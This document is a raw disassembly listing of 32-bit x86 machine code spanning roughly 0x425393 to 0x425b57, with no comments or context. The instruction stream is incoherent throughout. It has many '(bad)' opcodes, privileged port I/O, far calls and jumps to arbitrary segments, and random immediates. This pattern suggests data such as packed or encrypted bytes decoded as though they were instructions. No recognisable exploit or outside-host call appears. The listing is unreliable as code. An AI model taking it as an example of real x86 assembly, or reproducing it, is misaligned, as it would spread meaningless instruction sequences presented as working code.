  425393:	test   al,0xfa
  425395:	pop    edx
  425396:	test   DWORD PTR ds:0x71614510,0xed086100
  4253a0:	xchg   esp,eax
  4253a1:	pop    eax
  4253a2:	pop    esp
  4253a3:	fmul   st,st(1)
  4253a5:	fprem  
  4253a7:	sbb    BYTE PTR ds:[edi],dl
  4253aa:	dec    eax
  4253ab:	jg     0x42538f
  4253ad:	mov    ds:0xb605d391,al
  4253b2:	frstor [ebx+0x755e29d4]
  4253b8:	jne    0x425372
  4253ba:	(bad)  
  4253bb:	jne    0x4253a9
  4253bd:	cmp    DWORD PTR [ebx+0x16],edx
  4253c0:	add    eax,DWORD PTR [esi]
  4253c2:	and    eax,0x776a469c
  4253c7:	sti    
  4253c8:	outs   dx,DWORD PTR ds:[esi]
  4253c9:	and    ah,BYTE PTR [ecx]
  4253cb:	mov    esp,0x9d4e1533
  4253d0:	out    dx,eax
  4253d1:	fcomip st,st(0)
  4253d3:	xor    BYTE PTR es:[ebp+0x5f],0x79
  4253d8:	mov    dl,0xe0
  4253da:	js     0x4253d2
  4253dc:	ret    0xd588
  4253df:	fisttp QWORD PTR [edi-0x7323c747]
  4253e5:	popa   
  4253e6:	sbb    al,0xdb
  4253e8:	pusha  
  4253e9:	dec    esi
  4253ea:	call   FWORD PTR [ebx-0x78]
  4253ed:	sbb    ebx,DWORD PTR [edi+0x46]
  4253f0:	je     0x425417
  4253f2:	mov    dl,0x17
  4253f4:	es pop esp
  4253f6:	outs   dx,DWORD PTR ds:[esi]
  4253f7:	sub    cl,BYTE PTR [eax-0x45]
  4253fa:	and    al,0xa9
  4253fc:	jmp    0xc8f14d61
  425401:	push   ebx
  425402:	dec    ebp
  425403:	sti    
  425404:	test   ebx,ecx
  425406:	shl    BYTE PTR ds:0x490b4d96,1
  42540c:	mov    esp,0x5423d2c3
  425411:	aas    
  425412:	in     al,dx
  425413:	sahf   
  425414:	aam    0xe2
  425416:	scas   eax,DWORD PTR es:[edi]
  425417:	fdivr  DWORD PTR [eax]
  425419:	call   0xd412:0x4c9ba4cc
  425420:	jl     0x4253ff
  425422:	imul   esi,ebp,0xffffffd7
  425425:	data16 lods al,BYTE PTR ds:[esi]
  425427:	shl    DWORD PTR [eax+edx*4-0x8c29c11],1
  42542e:	inc    ebp
  42542f:	idiv   DWORD PTR [eax-0xc1d986c]
  425435:	inc    edi
  425436:	xor    dl,BYTE PTR [esi]
  425438:	mov    edx,DWORD PTR [eax+0x7df55558]
  42543e:	jb     0x4253d7
  425440:	jp     0x4253f9
  425442:	xor    DWORD PTR [edi+0x48],ecx
  425445:	shl    BYTE PTR [esi-0x4f],0x6a
  425449:	bound  esp,QWORD PTR [eax+0x6]
  42544c:	adc    eax,0x8046f066
  425451:	jb     0x4254c3
  425453:	push   eax
  425454:	add    eax,edi
  425456:	test   BYTE PTR [ebx-0x18],bh
  425459:	and    DWORD PTR [esi+0x35],edx
  42545c:	jne    0x425479
  42545e:	sub    al,0x71
  425460:	xchg   BYTE PTR [ecx+eiz*1],al
  425463:	fwait
  425464:	jae    0x425419
  425466:	add    eax,0xa07bdc39
  42546b:	aad    0x7d
  42546d:	pop    ecx
  42546e:	sahf   
  42546f:	xlat   BYTE PTR ds:[ebx]
  425470:	repz mov WORD PTR [ebx],?
  425473:	(bad)  
  425474:	test   edi,0xcc1073cc
  42547a:	cmc    
  42547b:	dec    edi
  42547c:	add    BYTE PTR [esi-0x2ba94dc1],cl
  425482:	stos   BYTE PTR es:[edi],al
  425483:	sub    edi,DWORD PTR [esp+ebp*2]
  425486:	sub    al,0xe3
  425488:	mov    edx,0x909e0d7b
  42548d:	jnp    0x425465
  42548f:	loope  0x425430
  425491:	cld    
  425492:	sub    eax,0xc6232102
  425497:	mov    ebx,0x5588e17e
  42549c:	push   0xffffffc8
  42549e:	ja     0x425441
  4254a0:	shl    DWORD PTR [ecx],1
  4254a2:	xchg   ebx,eax
  4254a3:	stos   BYTE PTR es:[edi],al
  4254a4:	jmp    0x38ca:0xaae1d4cf
  4254ab:	and    edx,DWORD PTR [ecx+0x2]
  4254ae:	sub    dl,BYTE PTR [ebx]
  4254b0:	fldz   
  4254b2:	ss jbe 0x42549a
  4254b5:	add    BYTE PTR [edx],ah
  4254b7:	inc    edi
  4254b8:	in     eax,0x79
  4254ba:	sbb    ah,BYTE PTR [esi+0x5daa6a83]
  4254c0:	dec    ebx
  4254c1:	mov    esp,0x36fcc44d
  4254c6:	loopne 0x4254f4
  4254c8:	jb     0x425513
  4254ca:	gs push ss
  4254cc:	push   ebp
  4254cd:	bound  esi,QWORD PTR [esi]
  4254cf:	ss jle 0x4254c8
  4254d2:	mov    DWORD PTR [bx+si-0x5821],edi
  4254d7:	outs   dx,BYTE PTR ds:[esi]
  4254d8:	scas   al,BYTE PTR es:[edi]
  4254d9:	cdq    
  4254da:	cwde   
  4254db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254dc:	fsub   QWORD PTR [ecx+0x3e]
  4254df:	loop   0x4254cc
  4254e1:	pop    eax
  4254e2:	inc    eax
  4254e3:	xchg   edi,eax
  4254e4:	stc    
  4254e5:	call   DWORD PTR ds:0x5512fba4
  4254eb:	dec    esp
  4254ec:	xchg   ebx,eax
  4254ed:	and    bl,ch
  4254ef:	mov    esp,0xf4e005b8
  4254f4:	push   ds
  4254f5:	mov    dh,0xfd
  4254f7:	jp     0x425485
  4254f9:	inc    eax
  4254fa:	les    ebx,FWORD PTR [edx+0x7f]
  4254fd:	jns    0x42554e
  4254ff:	xchg   ebx,eax
  425500:	add    al,0x7a
  425502:	adc    al,BYTE PTR [esi+0x3c]
  425505:	inc    ebp
  425506:	scas   al,BYTE PTR es:[edi]
  425507:	in     eax,dx
  425508:	inc    ebp
  425509:	mov    dl,0x4b
  42550b:	shl    DWORD PTR [esi+0x7caf903d],cl
  425511:	mov    fs,WORD PTR [edi]
  425513:	ror    DWORD PTR [ecx+eiz*4-0x39],0xa7
  425518:	or     dh,BYTE PTR [edx+0x5c]
  42551b:	aam    0x8f
  42551d:	stc    
  42551e:	push   ecx
  42551f:	mov    dh,0xf1
  425521:	jmp    0x2e14:0x4269130e
  425528:	xchg   esi,eax
  425529:	popf   
  42552a:	mov    al,0x65
  42552c:	jne    0x42554a
  42552e:	pop    esi
  42552f:	ror    eax,0xf7
  425532:	mov    edi,0x25824bbd
  425537:	nop
  425538:	xor    al,0x7c
  42553a:	jmp    0x9e3f:0x238472be
  425541:	arpl   WORD PTR ds:0x6726f925,sp
  425547:	pop    ebp
  425548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425549:	mov    ch,0xa0
  42554b:	cmp    DWORD PTR [ecx-0x557de2b5],esp
  425551:	outs   dx,BYTE PTR ds:[esi]
  425552:	clc    
  425553:	sub    al,0x88
  425555:	fs sub al,0x68
  425558:	sub    esi,ebx
  42555a:	sar    esi,cl
  42555c:	loop   0x42557a
  42555e:	push   cs
  42555f:	aas    
  425560:	cmp    eax,0xe67a632c
  425565:	es dec ecx
  425567:	loopne 0x42552a
  425569:	repz popa 
  42556b:	mov    ss,WORD PTR [edi-0x4b]
  42556e:	scas   al,BYTE PTR es:[edi]
  42556f:	hlt    
  425570:	repnz dec esi
  425572:	imul   eax,ebx,0x6af68413
  425578:	mov    eax,ds:0xfd0ff01a
  42557d:	mov    bl,ah
  42557f:	(bad)  
  425580:	out    dx,al
  425581:	cmp    BYTE PTR [esi+0x8224df6],bl
  425587:	mov    esi,ebp
  425589:	pop    es
  42558a:	fiadd  WORD PTR [ebp+0x51]
  42558d:	mov    esi,0xaed1db6f
  425592:	dec    esp
  425593:	cmp    bl,dh
  425595:	mov    dh,0x5d
  425597:	test   DWORD PTR [eax-0x1],edx
  42559a:	ret    
  42559b:	fidiv  DWORD PTR [ecx+0x66]
  42559e:	jbe    0x42552a
  4255a0:	push   0xce1d04c4
  4255a5:	stos   BYTE PTR es:[edi],al
  4255a6:	jns    0x4255d1
  4255a8:	fs ins DWORD PTR es:[edi],dx
  4255aa:	xlat   BYTE PTR ds:[ebx]
  4255ab:	call   0xd552:0x1caeabc9
  4255b2:	and    ah,BYTE PTR [ebx+0x26bf21a7]
  4255b8:	sub    dh,BYTE PTR ds:0xa29252ef
  4255be:	sub    DWORD PTR [edi+0x2330c146],edi
  4255c4:	mov    eax,es
  4255c6:	ret    0x83cd
  4255c9:	xor    al,0xe4
  4255cb:	(bad)  
  4255cc:	cld    
  4255cd:	ss popf 
  4255cf:	add    DWORD PTR [eax-0x32f6c2d2],esp
  4255d5:	add    BYTE PTR [ebp+0x39a18737],0x37
  4255dc:	jns    0x4255f4
  4255de:	popf   
  4255df:	loopne 0x42562e
  4255e1:	sub    bl,BYTE PTR [eax-0x6]
  4255e4:	jb     0x42556f
  4255e6:	hlt    
  4255e7:	mov    ds:0x80fb8ec7,eax
  4255ec:	lock xchg ebx,eax
  4255ee:	or     DWORD PTR [ecx],esp
  4255f0:	and    ah,al
  4255f2:	mov    eax,ds:0x458319f2
  4255f7:	imul   eax,DWORD PTR [edi+0x10],0xfffffff8
  4255fb:	jno    0x425665
  4255fd:	(bad)  
  4255ff:	push   ebx
  425600:	rol    DWORD PTR [edx-0x72],cl
  425603:	xchg   esi,eax
  425604:	je     0x425620
  425606:	sub    DWORD PTR ds:0xf09d3b57,ecx
  42560c:	aas    
  42560d:	imul   edx,DWORD PTR [edi+0x74],0xfffffff5
  425611:	js     0x42564c
  425613:	aas    
  425614:	mov    edx,0xb2c4366e
  425619:	retf   
  42561a:	(bad)  
  42561b:	aas    
  42561c:	pop    ds
  42561d:	or     BYTE PTR [esi-0x34ae66a1],cl
  425623:	stc    
  425624:	sbb    al,0x4e
  425626:	clc    
  425627:	mov    eax,ds:0xd207c8c9
  42562c:	pop    esi
  42562d:	push   edx
  42562e:	in     al,0xb0
  425630:	mov    edi,0xdd98c4d4
  425635:	xchg   ebx,eax
  425636:	aas    
  425637:	push   edi
  425638:	out    0x4c,eax
  42563a:	stc    
  42563b:	ror    DWORD PTR [eax],0xd9
  42563e:	push   esi
  42563f:	sub    eax,0xbf0a7236
  425644:	dec    esp
  425645:	pop    ebp
  425646:	daa    
  425647:	loope  0x42560c
  425649:	xor    al,0x57
  42564b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42564c:	scas   al,BYTE PTR es:[edi]
  42564d:	fild   DWORD PTR gs:[ecx]
  425650:	test   BYTE PTR [eax-0x66644a2f],0x9e
  425657:	sbb    DWORD PTR [edi-0x5d7866d4],eax
  42565d:	or     BYTE PTR [esi+0x34],ch
  425660:	test   al,0xd8
  425662:	mov    al,0xb5
  425664:	adc    edx,DWORD PTR ds:0xd5f1daa6
  42566a:	inc    ebp
  42566b:	mov    bl,BYTE PTR [ebx+0x542d136d]
  425671:	dec    esp
  425672:	mov    al,BYTE PTR [ebx+0x72c5e77e]
  425678:	xchg   esi,eax
  425679:	jmp    0xd66dbb5
  42567e:	call   0x7bfa:0x2f4750d2
  425685:	sbb    al,0x81
  425687:	jae    0x4256ec
  425689:	mov    edi,0xe825498e
  42568e:	jo     0x425632
  425690:	sti    
  425691:	push   ecx
  425692:	in     al,0x24
  425694:	sbb    ecx,DWORD PTR [ebp+eax*1-0x23]
  425698:	lods   eax,DWORD PTR ds:[esi]
  425699:	mov    ebx,DWORD PTR [eax]
  42569b:	adc    ax,0x426e
  42569f:	scas   al,BYTE PTR es:[edi]
  4256a0:	lahf   
  4256a1:	cld    
  4256a2:	add    eax,0x545c8025
  4256a7:	rcl    ebx,0x1c
  4256aa:	loop   0x4256af
  4256ac:	(bad)  
  4256ad:	shl    DWORD PTR [ecx-0x58],cl
  4256b0:	push   edi
  4256b1:	int    0xe7
  4256b3:	out    0x42,al
  4256b5:	in     al,0x31
  4256b7:	scas   eax,DWORD PTR es:[edi]
  4256b8:	hlt    
  4256b9:	inc    eax
  4256ba:	jnp    0x4256bd
  4256bc:	lahf   
  4256bd:	or     eax,0xe5923875
  4256c2:	adc    DWORD PTR [ecx-0x6814362a],0x15dc33e3
  4256cc:	leave  
  4256cd:	das    
  4256ce:	sub    eax,0x8d05cde3
  4256d3:	lods   al,BYTE PTR ds:[esi]
  4256d4:	sub    al,0x45
  4256d6:	dec    ecx
  4256d7:	cmc    
  4256d8:	and    esp,DWORD PTR [esp+edi*4+0x29]
  4256dc:	xor    BYTE PTR [ebx+0x1a],dh
  4256df:	push   ds
  4256e0:	call   0x989a0c16
  4256e5:	dec    ecx
  4256e6:	jge    0x425736
  4256e8:	xor    al,0x4c
  4256ea:	mov    edx,0x8d67fa3e
  4256ef:	jle    0x4256c4
  4256f1:	adc    bh,BYTE PTR [ebx+0x52]
  4256f4:	push   esp
  4256f5:	loope  0x4256b5
  4256f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256f8:	retf   
  4256f9:	add    esp,DWORD PTR [ecx+0x1f]
  4256fc:	inc    edx
  4256fd:	sbb    esp,DWORD PTR [eax]
  4256ff:	dec    ecx
  425700:	(bad)  
  425701:	xchg   edi,eax
  425702:	mov    al,ds:0x770a5897
  425707:	mov    ds:0x19731ebc,al
  42570c:	sar    esp,1
  42570e:	in     al,0x8a
  425710:	test   BYTE PTR [ecx+edx*4+0x63912aa5],0xf4
  425718:	pusha  
  425719:	clc    
  42571a:	inc    edi
  42571b:	ficomp DWORD PTR [edx+edx*8+0x5df390fb]
  425722:	aad    0x81
  425724:	imul   DWORD PTR [edx+0x9b81cf5]
  42572a:	sbb    BYTE PTR [esp+ebp*4-0x1e],dh
  42572e:	int    0x64
  425730:	cmp    eax,DWORD PTR [ebp+0x5e35af95]
  425736:	out    0x1b,al
  425738:	mov    cl,0xe
  42573a:	pop    edx
  42573b:	xor    dl,BYTE PTR [edi-0x6]
  42573e:	ss fs push ss
  425741:	push   ecx
  425742:	mov    ebx,0xfc3301e5
  425747:	push   cs
  425748:	jne    0x425722
  42574a:	pushf  
  42574b:	push   esi
  42574c:	sbb    esp,esp
  42574e:	bound  ebx,QWORD PTR gs:[edi+0x2a]
  425752:	or     DWORD PTR ds:0x3bad6832,edx
  425758:	jecxz  0x4256f5
  42575a:	aam    0x7d
  42575c:	lahf   
  42575d:	cli    
  42575e:	push   es
  42575f:	mov    ecx,0x8cb69ec8
  425764:	adc    al,0xe4
  425766:	add    bl,dh
  425768:	inc    ecx
  425769:	mov    ds:0xe201f056,eax
  42576e:	xor    eax,0xd2939bf6
  425773:	adc    eax,DWORD PTR [edx-0x89bbb9f]
  425779:	cli    
  42577a:	mov    dl,0x2d
  42577c:	adc    al,0xe9
  42577e:	pop    ss
  42577f:	cmp    eax,0x622907da
  425784:	cmp    al,0x4d
  425786:	xchg   ebx,eax
  425787:	add    eax,0x41a69118
  42578c:	(bad)  
  42578d:	push   cs
  42578e:	nop
  42578f:	arpl   WORD PTR [edx+0x5b417d5f],bx
  425795:	jb     0x42578c
  425797:	cmp    ah,BYTE PTR es:[esi]
  42579a:	dec    esi
  42579b:	pop    ebp
  42579c:	add    DWORD PTR [ebx],edi
  42579e:	out    0xf,al
  4257a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4257a9:	add    BYTE PTR [edx+0x43],cl
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	enter  0x4050,0xe5
  4257bc:	add    DWORD PTR [eax],eax
  4257be:	jg     0x4257c6
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	in     al,0x42
  4257c4:	xor    eax,0x1365ff6e
  4257c9:	and    DWORD PTR [ecx-0x99e44d2],ebx
  4257cf:	inc    esp
  4257d0:	lods   al,BYTE PTR ds:[esi]
  4257d1:	pop    ecx
  4257d2:	dec    ecx
  4257d3:	mov    WORD PTR [ecx-0x2deba815],ds
  4257d9:	add    eax,0xd392fdae
  4257de:	jne    0x42583e
  4257e0:	inc    edi
  4257e1:	adc    bl,BYTE PTR [edi+0x45]
  4257e4:	ins    DWORD PTR es:[edi],dx
  4257e5:	xor    cl,BYTE PTR [ecx-0x6c]
  4257e8:	dec    ebp
  4257e9:	fistp  QWORD PTR [esi]
  4257eb:	cdq    
  4257ec:	(bad)  
  4257ed:	add    al,0x47
  4257ef:	cmp    DWORD PTR [eax],0x4302ad2a
  4257f5:	cmp    ebx,0x41
  4257f8:	imul   edx,DWORD PTR [edx+0x2daa1e69],0x9e6ba2d0
  425802:	ds sub eax,0x22710ad2
  425808:	fadd   DWORD PTR [edx+ebp*4+0x4d3bd491]
  42580f:	or     bh,BYTE PTR [ebx]
  425811:	xor    edx,DWORD PTR [eax-0xeecf989]
  425817:	push   0x7017547d
  42581c:	ror    DWORD PTR [eax-0xf5ed8bd],1
  425822:	std    
  425823:	int    0x80
  425825:	add    esp,ebp
  425827:	lods   al,BYTE PTR ds:[esi]
  425828:	dec    esp
  425829:	sub    eax,0x56b471d1
  42582e:	and    eax,0x4efe4e65
  425833:	cmp    eax,ebp
  425835:	mov    ds:0x95c05317,eax
  42583a:	bound  eax,QWORD PTR [esi]
  42583c:	push   eax
  42583d:	sbb    BYTE PTR [edi],ch
  42583f:	aad    0x4f
  425841:	mov    ch,0x6d
  425843:	gs dec ecx
  425845:	jnp    0x425804
  425847:	mov    ah,BYTE PTR [esp+edx*4]
  42584a:	std    
  42584b:	int    0x80
  42584d:	add    eax,0x66d0b16c
  425852:	jne    0x425833
  425854:	jge    0x425873
  425856:	cli    
  425857:	push   ebp
  425858:	adc    eax,0xda099a4c
  42585d:	sub    BYTE PTR [ecx-0x76718855],cl
  425863:	mov    esi,0x9e8e0861
  425868:	xchg   esi,eax
  425869:	pop    eax
  42586a:	jnp    0x425829
  42586c:	adc    BYTE PTR [eax-0x21],0xd8
  425870:	scas   eax,DWORD PTR es:[edi]
  425871:	add    edx,DWORD PTR [ecx+ecx*2]
  425874:	jge    0x4258a3
  425876:	fisttp WORD PTR [ebp-0x4e]
  425879:	mov    WORD PTR [ecx+eiz*8+0x6e],?
  42587d:	repz push ebx
  42587f:	sti    
  425880:	ret    0x399f
  425883:	pop    ebx
  425884:	push   eax
  425885:	stc    
  425886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425887:	dec    edx
  425888:	test   BYTE PTR [eax-0x353b7fa9],dl
  42588e:	cmp    al,0x5e
  425890:	jmp    0x4e703ca
  425895:	adc    al,BYTE PTR [bx]
  425898:	(bad)  
  425899:	hlt    
  42589a:	pop    edx
  42589b:	sbb    al,0x10
  42589d:	retf   
  42589e:	cmp    al,0xcc
  4258a0:	in     eax,0x12
  4258a2:	ss dec ecx
  4258a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258a5:	in     eax,dx
  4258a6:	mov    BYTE PTR [ebx-0x3ffae644],bh
  4258ac:	adc    al,0x47
  4258ae:	mov    ebx,0xb1a7a991
  4258b3:	sti    
  4258b4:	pop    ss
  4258b5:	leave  
  4258b6:	jmp    0x6c98f8b3
  4258bb:	fdivr  QWORD PTR [esi-0x27]
  4258be:	sub    al,0x8f
  4258c0:	dec    ebx
  4258c1:	mov    dl,0x24
  4258c3:	pop    edx
  4258c4:	stos   BYTE PTR es:[edi],al
  4258c5:	sbb    edx,ebx
  4258c7:	das    
  4258c8:	fs pop ebp
  4258ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258cb:	mov    ecx,0x4b1ca34
  4258d0:	in     al,dx
  4258d1:	rcr    BYTE PTR [edi-0x1b],cl
  4258d4:	outs   dx,DWORD PTR ds:[esi]
  4258d5:	(bad)  
  4258d6:	aas    
  4258d7:	push   edi
  4258d8:	mov    edx,ebp
  4258da:	imul   DWORD PTR [edx-0x60]
  4258dd:	pop    esp
  4258de:	inc    edi
  4258df:	mov    eax,0xe5148f1d
  4258e4:	dec    ebx
  4258e5:	(bad)  
  4258e6:	pop    eax
  4258e7:	in     al,dx
  4258e8:	mov    ds:0x74470cf5,eax
  4258ed:	push   edi
  4258ee:	sub    BYTE PTR [esi+0x54ca0f3d],0x74
  4258f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258f6:	loopne 0x425948
  4258f8:	and    BYTE PTR [ebp+0x402d4ee2],dh
  4258fe:	inc    edi
  4258ff:	xchg   edi,eax
  425900:	gs call 0x3d9c:0xeb7ba913
  425908:	and    al,0xe4
  42590a:	shl    ah,1
  42590c:	mov    cs,WORD PTR [ebx-0x49e2f81d]
  425912:	mov    cl,0xb4
  425914:	ds cwde 
  425916:	je     0x42597f
  425918:	fnstsw WORD PTR [eax+esi*4+0x123cfc31]
  42591f:	pop    ecx
  425920:	daa    
  425921:	std    
  425922:	lahf   
  425923:	mov    bl,0x7b
  425925:	dec    ebx
  425926:	retf   0xb9e4
  425929:	fdivr  DWORD PTR [esi-0x3da27628]
  42592f:	sti    
  425930:	inc    esi
  425931:	dec    eax
  425932:	push   0xffffff92
  425934:	repz call 0xc00e:0xe175b72
  42593c:	outs   dx,DWORD PTR ds:[esi]
  42593d:	cmp    bl,cl
  42593f:	or     BYTE PTR [eax+0x29],ah
  425942:	xchg   DWORD PTR [edx+0x58],ecx
  425945:	lods   al,BYTE PTR ds:[esi]
  425946:	mov    bh,0xf
  425948:	or     bh,bh
  42594a:	dec    ebx
  42594b:	iret   
  42594c:	arpl   cx,dx
  42594e:	aas    
  42594f:	popf   
  425950:	in     eax,0x3
  425952:	xchg   ecx,eax
  425953:	lea    eax,ds:[edx-0x1ca043e4]
  42595a:	sub    eax,0x1d23fb91
  42595f:	test   esi,edi
  425961:	sub    al,BYTE PTR [eax+0x3e7cf386]
  425967:	mov    dh,BYTE PTR [edi]
  425969:	sbb    bl,cl
  42596b:	sahf   
  42596c:	cld    
  42596d:	cwde   
  42596e:	jno    0x4259ae
  425970:	int3   
  425971:	(bad)  
  425972:	xor    al,0x37
  425974:	push   ecx
  425975:	(bad)  
  425977:	repnz fisttp QWORD PTR [esi]
  42597a:	faddp  st(7),st
  42597c:	shl    BYTE PTR gs:[eax],1
  42597f:	pop    ss
  425980:	adc    BYTE PTR [edi-0x6f],bh
  425983:	leave  
  425984:	icebp  
  425985:	fnsave [edi-0x65]
  425988:	in     al,0x9
  42598a:	add    bh,BYTE PTR [esi]
  42598c:	out    dx,eax
  42598d:	sti    
  42598e:	xor    ah,BYTE PTR [eax]
  425990:	sub    al,0x28
  425992:	pop    ds
  425993:	aam    0x27
  425995:	inc    edx
  425996:	lock lods al,BYTE PTR ds:[esi]
  425998:	mov    WORD PTR [ebx+0x406923c4],?
  42599e:	or     al,0x4
  4259a0:	cmc    
  4259a1:	adc    eax,DWORD PTR ds:0x8e8249af
  4259a7:	out    0x88,eax
  4259a9:	pop    esi
  4259aa:	push   0x76
  4259ac:	retf   0x2850
  4259af:	(bad)  
  4259b0:	hlt    
  4259b1:	bound  ebp,QWORD PTR [ebx-0x5b8a654b]
  4259b7:	mov    dh,0x15
  4259b9:	jns    0x42595b
  4259bb:	nop
  4259bc:	fld    QWORD PTR [esi]
  4259be:	cdq    
  4259bf:	xchg   esp,eax
  4259c0:	mov    BYTE PTR [ebp+0x36e9a50f],ah
  4259c6:	cmp    ch,BYTE PTR [eax]
  4259c8:	push   edi
  4259c9:	dec    ecx
  4259ca:	dec    edi
  4259cb:	or     esp,esi
  4259cd:	jl     0x425a15
  4259cf:	jp     0x425984
  4259d1:	ins    DWORD PTR es:[edi],dx
  4259d2:	les    ebp,FWORD PTR [ebx-0x3111f7a6]
  4259d8:	adc    eax,0x51979a0f
  4259dd:	fnsave [edi+0x327eee22]
  4259e3:	cmc    
  4259e4:	enter  0x7517,0x19
  4259e8:	dec    BYTE PTR [ebp+0x5724a069]
  4259ee:	aad    0xdf
  4259f0:	cmp    bl,BYTE PTR [ebx-0x3f]
  4259f3:	inc    esi
  4259f4:	fnstcw WORD PTR [edx-0x6e32752f]
  4259fa:	xchg   DWORD PTR [esi-0x45],esp
  4259fd:	aad    0xe2
  4259ff:	push   cs
  425a00:	pop    eax
  425a01:	xor    al,0xc3
  425a03:	or     al,0xcb
  425a05:	stos   BYTE PTR es:[edi],al
  425a06:	test   BYTE PTR [edi+edi*1],dh
  425a09:	dec    esp
  425a0a:	cmp    BYTE PTR [edx+0x29],dl
  425a0d:	lods   al,BYTE PTR ds:[esi]
  425a0e:	xchg   ebx,eax
  425a0f:	sbb    dl,ah
  425a11:	mov    edi,0xf1c6f419
  425a16:	loope  0x425a46
  425a18:	pushf  
  425a19:	cmp    ch,BYTE PTR [edx+0x2fb33fe1]
  425a1f:	js     0x425a4f
  425a21:	pop    edx
  425a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a23:	push   cs
  425a24:	mov    esp,DWORD PTR [edi]
  425a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a27:	xchg   edi,eax
  425a28:	dec    eax
  425a29:	push   esp
  425a2a:	xchg   DWORD PTR [edi],edx
  425a2c:	sub    al,0xa1
  425a2e:	pop    esi
  425a2f:	or     bh,ch
  425a31:	mov    ebp,0x80f2ff9d
  425a36:	ror    BYTE PTR [ebx-0x1c],cl
  425a39:	jle    0x425a16
  425a3b:	mov    cl,0xbc
  425a3d:	xor    BYTE PTR [ecx],dh
  425a3f:	pop    ebx
  425a40:	les    esi,FWORD PTR [esp+ebp*4+0x2d]
  425a44:	xlat   BYTE PTR ds:[ebx]
  425a45:	jno    0x425ab5
  425a47:	mov    ecx,0xc42df1a5
  425a4c:	(bad)  
  425a4d:	cdq    
  425a4e:	retf   
  425a4f:	pop    ss
  425a50:	add    eax,0xa5466ebd
  425a55:	fist   DWORD PTR [ebx+eiz*1-0x64d89613]
  425a5c:	xor    esi,esp
  425a5e:	adc    al,0x4
  425a60:	or     al,0xf6
  425a62:	(bad)  
  425a63:	jmp    0x425a4d
  425a65:	fidiv  DWORD PTR [esp+esi*2+0x7c6685ad]
  425a6c:	js     0x425a57
  425a6e:	dec    esp
  425a6f:	mov    bl,0x64
  425a71:	lds    eax,FWORD PTR [ebp-0x1b]
  425a74:	shl    dh,cl
  425a76:	add    eax,0x645d4edb
  425a7b:	pop    edi
  425a7c:	arpl   WORD PTR [esi],ax
  425a7e:	jo     0x425a76
  425a80:	in     al,dx
  425a81:	push   esi
  425a82:	pushf  
  425a83:	dec    esp
  425a84:	jo     0x425a98
  425a86:	push   edi
  425a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a88:	mov    ds:0xf80baccf,al
  425a8d:	(bad)  
  425a8e:	push   eax
  425a8f:	mov    bh,0x23
  425a91:	lods   al,BYTE PTR ds:[esi]
  425a92:	js     0x425a88
  425a94:	mov    WORD PTR [eax+edx*8],ds
  425a97:	mov    edi,0xd8aec91
  425a9c:	outs   dx,DWORD PTR ds:[esi]
  425a9d:	sbb    cl,0x8c
  425aa0:	push   0xd758347d
  425aa5:	cmp    bh,ch
  425aa7:	call   0xbe0687f1
  425aac:	aaa    
  425aad:	cmp    DWORD PTR [ebp+0x32],eax
  425ab0:	fistp  WORD PTR [eax+0x11]
  425ab3:	inc    eax
  425ab4:	stc    
  425ab5:	scas   eax,DWORD PTR es:[edi]
  425ab6:	xor    BYTE PTR [eax],bh
  425ab8:	and    ecx,DWORD PTR [edi-0x6c56f5cd]
  425abe:	or     eax,0x627d29bf
  425ac3:	adc    ecx,DWORD PTR [eax-0x609f26c]
  425ac9:	pop    ebx
  425aca:	ret    
  425acb:	jne    0x425b48
  425acd:	cmp    cl,BYTE PTR es:[ecx-0x6b]
  425ad1:	pop    ss
  425ad2:	imul   esi,DWORD PTR [edi+0xd3c3ee1],0xb10be7a7
  425adc:	test   eax,0x8e369bb3
  425ae1:	pop    ds
  425ae2:	out    dx,al
  425ae3:	dec    esi
  425ae4:	push   eax
  425ae5:	pop    ebp
  425ae6:	out    dx,al
  425ae7:	lods   al,BYTE PTR ds:[esi]
  425ae8:	mov    esi,0xc4c8821d
  425aed:	add    al,0x31
  425aef:	repz lahf 
  425af1:	daa    
  425af2:	not    BYTE PTR [esi-0x794df27b]
  425af8:	adc    BYTE PTR [esi+0x1f5652a6],ah
  425afe:	sub    al,0x8f
  425b00:	retf   0x503c
  425b03:	sti    
  425b04:	sahf   
  425b05:	push   es
  425b06:	shr    edi,0xc
  425b09:	nop
  425b0a:	inc    ebp
  425b0b:	aad    0x78
  425b0d:	xchg   BYTE PTR [edx-0x7a64d57b],bl
  425b13:	push   ss
  425b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b15:	inc    eax
  425b16:	or     edi,DWORD PTR [ecx]
  425b18:	jmp    0x425b26
  425b1a:	add    eax,0xa918e906
  425b1f:	das    
  425b20:	jge    0x425b80
  425b22:	sub    esi,DWORD PTR [ebx+0xc7ae9ba]
  425b28:	enter  0x82e8,0x9a
  425b2c:	dec    ecx
  425b2d:	cmc    
  425b2e:	sbb    dh,BYTE PTR [ebx+0x7a]
  425b31:	out    0xd4,al
  425b33:	push   esi
  425b34:	jnp    0x425b36
  425b36:	pop    ebp
  425b37:	cmp    BYTE PTR [edx-0x61],dh
  425b3a:	and    dl,BYTE PTR [edi+0x1d]
  425b3d:	push   ebx
  425b3e:	gs or  al,0xf4
  425b41:	(bad)  
  425b42:	enter  0x45da,0x45
  425b46:	aad    0x78
  425b48:	xchg   esp,eax
  425b49:	fwait
  425b4a:	sub    eax,0x26f2bc5
  425b4f:	outs   dx,BYTE PTR ds:[esi]
  425b50:	dec    esi
  425b51:	scas   al,BYTE PTR es:[edi]
  425b52:	addr16 jne 0x425bc9
  425b55:	jns    0x425ada
  425b57:	cdq    
